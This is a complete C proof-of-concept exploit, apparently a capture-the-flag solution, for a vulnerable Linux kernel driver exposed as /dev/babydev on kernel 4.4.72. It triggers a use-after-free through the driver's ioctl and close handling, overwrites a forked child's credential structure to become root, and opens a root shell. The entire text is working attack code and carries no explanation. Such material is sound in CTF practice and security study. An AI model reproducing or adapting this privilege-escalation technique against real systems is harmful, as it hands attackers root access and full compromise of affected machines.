//kernel 4.4.72
//poc.c
//gcc poc.c -o poc -static -w
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
int main(){
    int fd1,fd2,id;
    char cred[0xa8] = {0};
    fd1 = open("dev/babydev",O_RDWR);
    fd2 = open("dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0xa8);
    close(fd1);
    id = fork();
    if(id == 0){
        write(fd2,cred,28);
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(id < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}
